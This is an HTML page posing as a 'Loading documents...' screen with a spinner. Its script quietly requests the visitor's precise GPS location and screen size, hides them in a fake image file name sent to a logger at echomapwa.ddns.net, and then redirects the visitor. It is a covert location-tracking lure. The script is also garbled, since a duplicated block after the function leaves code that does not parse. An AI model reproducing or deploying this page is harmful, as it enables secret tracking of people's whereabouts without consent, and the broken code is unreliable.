<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body> 
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        
        // ТВОИ НАСТРОЙКИ
        const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";

        async function collectAndGo() {
            if (!slug) return;
            
            let info = {
                sw: window.screen.width, sh: window.screen.height,
                lat: "null", lon: "null"
            };

            // 1. Сбор GPS
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {
                            enableHighAccuracy: true,
                            timeout: 4000, 
                            maximumAge: 0
                        });
                    });
                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                } catch (e) {}
            }

            // 2. Формируем имя файла
            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
            
            // 3. ОТПРАВКА ЧЕРЕЗ FETCH (ЖЕСТКАЯ)
            try {
                // Мы отправляем запрос и ЖДЕМ (await) ответа от сервера
                // mode: 'no-cors' позволяет слать запросы на http с https гитхаба
                await fetch(`${targetServer}${fileName}?t=${Date.now()}`, { 
                    mode: 'no-cors',
                    cache: 'no-store'
                });
                console.log("Data sent");
            } catch (e) {
                console.log("Fetch failed, but moving on...");
            }

            // 4. РЕДИРЕКТ (только после того как fetch завершился)
            window.location.href = `${finalRedirect}${slug}?ready=1`;
        }

            // 2. Формируем имя файла
            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
            
            // 3. Отправка и редирект
            const img = new Image();
            const go = () => {
                // Добавляем ?ready=1, чтобы остановить петлю на сервере
                window.location.href = `${finalRedirect}${slug}?ready=1`;
            };

            img.onload = img.onerror = go; 
            img.src = `${targetServer}${fileName}?t=${Date.now()}`;
            
            // Страховка (4 секунды)
            setTimeout(go, 4000);
        }

        collectAndGo();
    </script>
</body>
</html>
